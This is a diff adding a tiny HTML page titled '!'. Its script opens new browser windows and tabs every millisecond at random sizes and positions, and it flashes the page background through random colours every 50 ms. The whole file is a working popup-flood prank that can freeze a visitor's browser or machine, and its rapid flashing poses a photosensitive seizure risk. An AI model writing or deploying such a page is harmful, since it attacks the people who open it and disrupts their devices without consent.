@@ -1,0 +1,21 @@
+<head><title>!</title>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+</head>
+<body style="background-color:black;">
+</body>
+
+<head>
+  <script>
+    setInterval(function(){
+      let randomSize = Math.floor(Math.random() * (+1000 - +400) + +400);
+      let randomSide = Math.floor(Math.random() * (+2000 - +10) + +10);
+      window.open("#", "_blank", `top=${randomSide},left=${randomSide},width=${randomSize},height=${randomSize}`);
+      window.open("#")
+    }, 1)
+
+    setInterval(function(){
+      $("body").css("background-color", "rgb(" + Math.floor((Math.random() * 255 + 1)) + ", "+ Math.floor((Math.random() * 255 + 1)) +" , "+ Math.floor((Math.random() * 255 + 1)) +")")
+    }, 50)
+  </script>
+</head>
